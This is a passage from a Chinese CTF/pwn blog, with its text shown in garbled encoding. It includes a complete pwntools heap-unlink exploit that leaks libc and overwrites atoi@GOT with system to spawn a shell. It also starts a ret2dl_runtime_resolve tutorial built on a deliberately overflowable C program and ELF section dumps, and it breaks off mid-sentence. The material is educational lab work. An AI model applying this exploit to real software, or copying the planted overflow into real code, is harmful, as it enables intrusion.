class="headerlink" title="unlink"></a>unlink</h4><p>ä¼ªé€ å®Œæˆä¹‹å,é‡Šæ”¾ å †å—2 è¿™ä¸ªæ—¶å€™åœ¨å®ƒçœ‹æ¥å‰ä¸€ä¸ªå †å—æ˜¯å·²ç»è¢«é‡Šæ”¾çš„ç©ºé—²å †å—,é‚£ä¹ˆå°±è¦æ‰§è¡Œ <code>unlink</code> æ“ä½œ,æ£€æŸ¥ <code>fd bk</code> ä¹‹å,å‘ç°ç¬¦åˆæ¡ä»¶,äºæ˜¯å°±åœ¨ <code>fd + 0x18</code> çš„åœ°æ–¹å†™å…¥ å †å—1 çš„åœ°å€<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1585921508591.png" alt="file"></p><p>æ¥ç€ <code>edit</code> å †å—1 å°±æ˜¯åœ¨ä¿®æ”¹å†…å­˜äº†,å¯ä»¥è®© å †å—0 æŒ‡å‘ä»»æ„çš„åœ°å€(å¯å†™çš„)å»æ”¹å†™</p><h4 id="å®Œæ•´çš„exp"><a href="#å®Œæ•´çš„exp" class="headerlink" title="å®Œæ•´çš„exp"></a>å®Œæ•´çš„exp</h4><p>è¿™é‡Œåœ¨ leak libc ä¹‹åé€‰æ‹© <code>atoi</code>å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">fake = <span class="number">0x6020D8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(fake - <span class="number">0x18</span>) + p64(fake - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dbg(<span class="string">&quot;x/20gx 0x6020C0&quot;</span>)</span><br><span class="line">free_plt = elf.plt[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">pus_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x80</span>) + p64(free_got))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recv(<span class="number">4</span>)</span><br><span class="line">c = sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">addr = u64(c)</span><br><span class="line">base = addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">print(<span class="string">&quot;base ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(base))</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x80</span>)+p64(atoi_got))</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">sh.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl_runtime_resolve</title>
      <link href="/ret2dl.html"/>
      <url>/ret2dl.html</url>
      
        <content type="html"><![CDATA[<p>è¯•äº†è¯•ropç³»åˆ—æœ€éº»çƒ¦çš„ä¸€ä¸ªï¼ˆå¤§æ¦‚ï¼Ÿï¼‰</p><a id="more"></a><h1 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h1><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ret2dl.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> buffer[<span class="number">0x500</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;vuln\n&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;COPY</span><br><span class="line">gcc ret2dl.c -o test -m32 -fno-<span class="built_in">stack</span>-protector</span><br></pre></td></tr></table></figure><h3 id="elf-æ®µåˆ†å¸ƒ"><a href="#elf-æ®µåˆ†å¸ƒ" class="headerlink" title="elf æ®µåˆ†å¸ƒ"></a>elf æ®µåˆ†å¸ƒ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">shiroha@ubuntu:~/ret2dl$ readelf -S test </span><br><span class="line">There are 31 section headers, starting at offset 0x1830:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000060 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804822c 00022c 000050 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804827c 00027c 00000c 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048288 000288 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080482a8 0002a8 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             080482b0 0002b0 000018 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482c8 0002c8 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482f0 0002f0 000040 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048330 000330 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048340 000340 0001c2 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048504 000504 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048518 000518 00000e 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048528 000528 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        0804855c 00055c 0000ec 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a020 001020 001420 00  WA  0   0 32</span><br><span class="line">  [27] .comment          PROGBITS        00000000 001020 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 001723 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001058 000480 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 0014d8 00024b 00      0   0  1COPY</span><br></pre></td></tr></table></figure><p>å…³é”®çš„æœ‰</p><ol><li> <strong>bss -&gt; 0804a020</strong></li><li> <strong>dynsym -&gt; 0x080481cc</strong></li><li> <strong>dynstr -&gt; 0x0804822c</strong></li><li> <strong>plt -&gt; 0x080482f0</strong></li><li> <strong>rel.plt -&gt; 0x080482b0</strong></li><li> <strong>dynamic -&gt; 0x08049F14</strong></li></ol><h3 id="ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°"><a href="#ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°" class="headerlink" title="ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°"></a>ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°</h3><p><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-20200402163856904.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-20200402163856904-300x295.png" alt="img"></a></p><p>ç¬¬ä¸€æ¬¡è°ƒç”¨çš„æ—¶å€™</p><ol><li> <code>jmp</code> åˆ° <code>plt + 6</code> ä¹Ÿå°±æ˜¯ä¸‹ä¸€æ¡æŒ‡ä»¤</li><li> <code>push 0</code>(ä¸ºä»€ä¹ˆæ˜¯0?</li><li> <code>jmp</code> åˆ° æ¥ä¸‹æ¥è¦è°ƒç”¨çš„ <code>_dl_runtime_resolve</code></li></ol><p><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-20200402164356634.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-20200402164356634-300x288.png" alt="img"></a></p><ol><li> é¦–å…ˆ <code>push</code> äº† <code>link map</code></li><li> <code>jmp _dl_runtim_resolve</code></li></ol><p>çœ‹ä¸€ä¸‹ <code>push</code> çš„åœ°å€é‡Œé¢æœ‰å•¥</p><p><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-20200402164634613.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-20200402164634613-300x27.png" alt="img"></a></p><p>ç¬¬ä¸‰ä¸ªæ•°æ®å°±æ˜¯ <code>dynamic</code> æ®µçš„åœ°å€</p><h4 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08049F14 ; Segment type: Pure data</span><br><span class="line">LOAD:08049F14 ; Segment permissions: Read&#x2F;Write</span><br><span class="line">LOAD:08049F14 LOAD            segment mempage public &#39;DATA&#39; use32</span><br><span class="line">LOAD:08049F14                 assume cs:LOAD</span><br><span class="line">LOAD:08049F14                 ;org 8049F14h</span><br><span class="line">LOAD:08049F14 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BCâ†‘o</span><br><span class="line">LOAD:08049F14                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_â†“o</span><br><span class="line">LOAD:08049F14                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F1C                 Elf32_Dyn &lt;0Ch, &lt;80482A8h&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:08049F24                 Elf32_Dyn &lt;0Dh, &lt;80484A4h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:08049F2C                 Elf32_Dyn &lt;19h, &lt;8049F08h&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:08049F34                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:08049F3C                 Elf32_Dyn &lt;1Ah, &lt;8049F0Ch&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:08049F44                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:08049F4C                 Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F54                 Elf32_Dyn &lt;5, &lt;804821Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:08049F5C                 Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049F64                 Elf32_Dyn &lt;0Ah, &lt;4Ah&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:08049F6C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049F74                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:08049F7C                 Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049F84                 Elf32_Dyn &lt;2, &lt;10h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F8C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049F94                 Elf32_Dyn &lt;17h, &lt;8048298h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:08049F9C                 Elf32_Dyn &lt;11h, &lt;8048290h&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049FA4                 Elf32_Dyn &lt;12h, &lt;8&gt;&gt;    ; DT_RELSZ</span><br><span class="line">LOAD:08049FAC                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049FB4                 Elf32_Dyn &lt;6FFFFFFEh, &lt;8048270h&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FBC                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FC4                 Elf32_Dyn &lt;6FFFFFF0h, &lt;8048266h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FCC                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure><p>å…¶ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DT_STRTAB -&gt; 0x804821C(.dynstr)</span><br><span class="line">DT_SYMTAB -&gt; 0x80481CC(.dynsym)</span><br><span class="line">DT_JMPREL -&gt; 0x8048298(.rel.plt)</span><br><span class="line">&#x2F;&#x2F;dynamic </span><br><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;COPY</span><br></pre></td></tr></table></figure><h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481CC ; ELF Symbol Table</span><br><span class="line">LOAD:080481CC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;offset aRead - offset byte_804822C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aGmonStart - offset byte_804822C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804822C, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:080481FC                            0&gt;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aWrite - offset byte_804822C, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;</span><br><span class="line">LOAD:0804821C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804822C, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:0804821C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:0804822C ; ELF String Table</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; </span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_SymCOPY</span><br></pre></td></tr></table></figure><p><code>st_name -&gt; (offset aRead - offset byte_804821C(.dynstr))</code> å³ <strong>éœ€è¦è½½å…¥çš„å‡½æ•°ç¬¦å·ç›¸å¯¹äºç¬¦å·è¡¨çš„åç§»é‡</strong></p><p><code>st_info -&gt; 12h</code> å¯¹äºå¯¼å…¥ç¬¦å· è¿™é‡Œåº”ä¸º 0x12</p><p>å…¶ä½™å­—æ®µå‡ä¸º0</p><h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080482A8 ; ELF REL Relocation Table</span><br><span class="line">LOAD:080482A8                 Elf32_Rel &lt;8049FFCh, 206h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:080482B0 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:080482B0                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:080482B8                 Elf32_Rel &lt;804A010h, 307h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:080482C0                 Elf32_Rel &lt;804A014h, 407h&gt; ; R_386_JMP_SLOT write</span><br><span class="line">LOAD:080482C0 LOAD            ends</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr    r_offset; </span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">&#125; Elf32_Rel;COPY</span><br><span class="line">r_offset -&gt; 0x804A00C(read@got)</span><br><span class="line">r_info &gt;&gt; 8 å¾—åˆ°ä¸€ä¸ªä¸‹æ ‡(1),å¯¹åº” å¯¼å…¥ç¬¦å·åœ¨ .dynsym ä¸­çš„ä¸‹æ ‡</span><br></pre></td></tr></table></figure><h4 id="å®é™…è¿‡ç¨‹"><a href="#å®é™…è¿‡ç¨‹" class="headerlink" title="å®é™…è¿‡ç¨‹"></a>å®é™…è¿‡ç¨‹</h4><p>ç›¸å½“äºè°ƒç”¨äº†ä¸€æ¬¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map,reloc_arg)</span><br><span class="line">reloc_arg ä¸ºå¯¼å…¥å‡½æ•°åœ¨ .rel.plt ä¸­çš„åç§»(æ­¤å¤„ä¸º0</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡è°ƒç”¨å®Œæ¯•ä¹‹å<code>read@got</code> å°±ä¼šå†™å…¥ read åœ¨ libc ä¸­çš„åœ°å€</p><h3 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&gt; 0xf7fee000 &lt;_dl_runtime_resolve&gt;:   push   eax</span><br><span class="line">   0xf7fee001 &lt;_dl_runtime_resolve+1&gt;:    push   ecx</span><br><span class="line">   0xf7fee002 &lt;_dl_runtime_resolve+2&gt;:    push   edx</span><br><span class="line">   0xf7fee003 &lt;_dl_runtime_resolve+3&gt;:    mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line">   0xf7fee007 &lt;_dl_runtime_resolve+7&gt;:    mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line">   0xf7fee00b &lt;_dl_runtime_resolve+11&gt;:   call   0xf7fe77e0 &lt;_dl_fixup&gt;</span><br><span class="line">   0xf7fee010 &lt;_dl_runtime_resolve+16&gt;:   pop    edx</span><br><span class="line">   0xf7fee011 &lt;_dl_runtime_resolve+17&gt;:   mov    ecx,DWORD PTR [esp]</span><br><span class="line">   0xf7fee014 &lt;_dl_runtime_resolve+20&gt;:   mov    DWORD PTR [esp],eax</span><br><span class="line">   0xf7fee017 &lt;_dl_runtime_resolve+23&gt;:   mov    eax,DWORD PTR [esp+0x4]COPY</span><br></pre></td></tr></table></figure><p>å’±ä¹Ÿä¸è®² <code>_dl_fixup</code>å‡½æ•°äº†,è¿™ä¸ªä¹‹åæœ‰æ—¶é—´åœ¨ç»†çœ‹</p><h4 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h4><ol><li> ç”¨ <code>link_map</code> è®¿é—® <a href="http://ethushiroha.com/?p=869#.dynamic">.dynamic</a> ä»ä¸­å–å‡º <a href="http://ethushiroha.com/.dynsym">.dynsym</a>,<a href="http://ethushiroha.com/.dynstr">.dynstr</a>,<a href="http://ethushiroha.com/.rel.plt">.rel.plt</a></li><li> <code>.rel.plt</code> + <code>reloc_arg</code> å¾—åˆ°å½“å‰å‡½æ•°çš„ <code>Elf32_Rel</code> ç»“æ„ä½“,è®°ä½œ <code>rel</code></li><li> <code>rel -&gt; r_info &gt;&gt; 8</code> ä½œä¸º <code>.dynsym</code> çš„ä¸‹æ ‡ å¾—å‡ºå½“å‰å‡½æ•°çš„ 